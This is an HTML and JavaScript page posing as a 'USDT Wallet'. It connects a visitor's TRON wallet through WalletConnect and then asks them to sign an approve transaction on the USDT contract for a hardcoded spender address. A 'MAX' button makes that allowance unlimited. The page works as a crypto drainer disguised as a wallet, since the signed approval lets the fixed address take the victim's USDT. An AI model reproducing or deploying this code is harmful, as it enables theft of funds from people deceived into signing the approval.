<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>USDT Wallet</title>

<style>
body{
  margin:0;
  background:#0b0f19;
  font-family:-apple-system,BlinkMacSystemFont,sans-serif;
  color:white;
}

.container{
  max-width:420px;
  margin:auto;
  padding:16px;
}

.header{
  text-align:center;
  font-size:20px;
  font-weight:600;
  margin-bottom:10px;
}

.card{
  background:#121826;
  border-radius:16px;
  padding:16px;
  margin-top:16px;
}

.wallet{
  font-size:13px;
  color:#4ade80;
  text-align:center;
}

button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  font-weight:600;
  margin-top:10px;
}

.connect{background:#3b82f6;color:white}
.approve{background:#22c55e;color:white}

.range{
  width:100%;
  margin-top:10px;
}

input{
  width:100%;
  padding:12px;
  border-radius:10px;
  border:none;
  margin-top:10px;
  background:#0f172a;
  color:white;
}

#qr{
  display:flex;
  justify-content:center;
  margin-top:10px;
}

#uri{
  font-size:10px;
  color:#888;
  word-break:break-all;
}

.status{
  font-size:12px;
  text-align:center;
  margin-top:10px;
  color:#aaa;
}
</style>
</head>

<body>

<div class="container">

  <div class="header">💰 USDT Wallet</div>

  <div class="card">

    <button id="connectBtn" class="connect">Connect Wallet</button>

    <div id="qr"></div>
    <div id="uri"></div>
    <a id="openWallet" target="_blank"></a>

    <div id="wallet" class="wallet"></div>

  </div>

  <div class="card">

    <div>Select Amount</div>

    <input type="range" id="range" class="range" min="1" max="1000" value="10">

    <input type="number" id="amountInput" value="10">

    <button id="maxBtn">MAX</button>

    <button id="approveBtn" class="approve">Approve USDT</button>

    <div id="status" class="status"></div>

  </div>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script type="module">
import bs58 from "https://esm.sh/bs58";

const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";

const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

let client, session;

// convert address
function tronToHex(addr){
  const bytes = bs58.decode(addr);
  return Array.from(bytes)
    .map(b => b.toString(16).padStart(2,"0"))
    .join("")
    .slice(0,42);
}

// encode approve
function encodeApprove(spenderHex, amount){
  const clean = spenderHex.replace(/^41/,"").padStart(64,"0");

  let amountHex;

  if(amount === "max"){
    amountHex = "f".repeat(64);
  } else {
    const val = BigInt(Math.floor(amount * 1e6));
    amountHex = val.toString(16).padStart(64,"0");
  }

  return "0x095ea7b3" + clean + amountHex;
}

// UI helpers
function setStatus(msg){
  document.getElementById("status").innerText = msg;
}

// QR + link
function showQR(uri){
  document.getElementById("qr").innerHTML = "";

  new QRCode(document.getElementById("qr"), {
    text: uri,
    width: 200,
    height: 200
  });

  document.getElementById("uri").innerText = uri;

  const link = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
  document.getElementById("openWallet").href = link;
  document.getElementById("openWallet").innerText = "Open in Trust Wallet";
}

// slider sync
const range = document.getElementById("range");
const input = document.getElementById("amountInput");

range.oninput = () => input.value = range.value;
input.oninput = () => range.value = input.value;

document.getElementById("maxBtn").onclick = () => {
  input.value = "max";
};

// connect wallet
document.getElementById("connectBtn").onclick = async () => {
  try{
    setStatus("Connecting...");

    const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");

    client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata:{
        name:"USDT Wallet",
        description:"Connect",
        url:location.origin,
        icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
      }
    });

    // reuse session if exists
    const existing = client.session.getAll();
    if(existing.length){
      session = existing[0];
    } else {
      const { uri, approval } = await client.connect({
        requiredNamespaces:{
          tron:{
            methods:["tron_sendTransaction"], // 🔥 FIXED
            chains:[TRON_CHAIN],
            events:[]
          }
        }
      });

      showQR(uri);
      session = await approval();
    }

    const wallet = session.namespaces.tron.accounts[0].split(":")[2];
    document.getElementById("wallet").innerText = wallet;

    setStatus("Connected");

  } catch(e){
    console.error(e);
    setStatus("Connection failed");
  }
};

// approve
document.getElementById("approveBtn").onclick = async () => {
  try{
    const wallet = session.namespaces.tron.accounts[0].split(":")[2];

    let amount = input.value;

    const spenderHex = tronToHex(SPENDER);
    const data = encodeApprove(spenderHex, amount === "max" ? "max" : Number(amount));

    setStatus("Waiting for wallet...");

    const result = await client.request({
      topic: session.topic,
      chainId: TRON_CHAIN,
      request:{
        method:"tron_sendTransaction",
        params:{
          to: USDT,
          data: data,
          value: "0x0"
        }
      }
    });

    setStatus("✅ Success");

  } catch(e){
    console.error(e);
    setStatus("❌ Failed");
  }
};
</script>

</body>
</html>
